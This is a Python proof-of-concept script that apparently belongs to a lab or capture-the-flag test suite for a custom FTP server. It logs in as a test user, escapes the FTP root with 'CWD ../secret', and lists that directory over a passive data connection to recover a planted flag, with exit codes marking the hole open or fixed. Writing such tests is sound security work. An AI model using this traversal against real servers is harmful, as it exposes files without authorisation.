#!/usr/bin/env python3
"""
PoC #4: CWD path traversal (directory listing disclosure)
-------------------------------------------------------------
handle_cwd() concatenates the argument onto session->cwd with no check
for ".." and no confinement to ROOT_DIR. LIST has no containment check
of its own, so once CWD has walked outside ftproot, LIST freely discloses
directory contents anywhere the server process can read - including the
runtime secret directory (secret/, a sibling of ftproot; see
write_flag_files() in fmm.cpp).

Note: RETR is a separate story - it has its own containment check
(is_path_within_root()), so a plain "CWD out + RETR a file" won't pull
file *contents* back from outside ftproot over the network alone. LIST
has no such check, so this PoC proves the traversal via directory
listing - and because LIST only ever discloses directory *entry names*,
never file contents, the server also drops a second copy of the flag in
secret/ under a filename equal to the flag itself, so the listing alone
recovers the real secret value, not just the fact that something is
there.

Run the server first: ./fmm
Then:  python3 04_path_traversal.py [host] [port]
"""
import os
import re
import socket
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2121

EXPECTED_FLAG = os.environ.get("FMM_FLAG") or "FLAG{local-dev-default}"


def connect():
    s = socket.create_connection((HOST, PORT), timeout=5)
    s.recv(4096)
    return s


def cmd(s, line, wait=False):
    import time
    s.sendall((line + "\n").encode())
    if wait:
        time.sleep(0.3)
    chunks = b""
    s.settimeout(0.5)
    try:
        while True:
            d = s.recv(65536)
            if not d:
                break
            chunks += d
    except socket.timeout:
        pass
    return chunks.decode(errors="replace")


def open_pasv(s):
    """Send PASV, parse the 227 reply, and return a connected data socket."""
    reply = cmd(s, "PASV")
    nums = reply[reply.index("(") + 1:reply.index(")")].split(",")
    port = int(nums[4]) * 256 + int(nums[5])
    return socket.create_connection((".".join(nums[:4]), port), timeout=5)


def main():
    s = connect()
    print(cmd(s, "USER alice"))
    print(cmd(s, "PASS password123"))

    print(cmd(s, "CWD ../secret"))

    # LIST output now travels over a data connection - open one with PASV,
    # fire LIST, then read the directory listing off the data socket.
    data = open_pasv(s)
    print(cmd(s, "LIST"))
    data.settimeout(1.0)
    listing = b""
    try:
        while True:
            d = data.recv(65536)
            if not d:
                break
            listing += d
    except socket.timeout:
        pass
    listing = listing.decode(errors="replace")
    print(listing[:1000])

    m = re.search(r"FLAG\{[^}]+\}", listing)
    if m and m.group(0) == EXPECTED_FLAG:
        print(f"[+] Path traversal confirmed - listed secret/ outside ftproot "
              f"and recovered this deployment's flag: {m.group(0)}")
        s.close()
        sys.exit(0)   # exploited -> vuln OPEN
    elif m:
        print(f"[-] Listed a flag-shaped entry but it didn't match FMM_FLAG "
              f"for this run: {m.group(0)!r}")
    else:
        print(f"[-] Did not find the flag in the listing: {listing!r}")
    s.close()
    sys.exit(1)       # blocked -> vuln FIXED


if __name__ == "__main__":
    main()
